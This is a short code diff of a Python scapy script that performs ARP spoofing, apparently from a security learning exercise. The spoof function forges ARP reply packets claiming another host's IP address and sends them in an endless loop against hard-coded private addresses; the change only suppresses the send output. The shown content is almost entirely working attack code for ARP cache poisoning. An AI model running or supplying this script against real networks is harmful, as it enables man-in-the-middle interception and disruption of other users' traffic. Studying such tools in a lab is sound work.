@@ -14,7 +14,7 @@ def get_mac(ip):
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) #op=2 creates response instead of request; pdst=IP; hwdst=MAC; psrc=source
-    scapy.send(packet)
+    scapy.send(packet, verbose=False) #verbose=False gets rid of constantly telling user that packet was sent
 
 while True:
     spoof("10.0.0.1", "10.0.1.1")
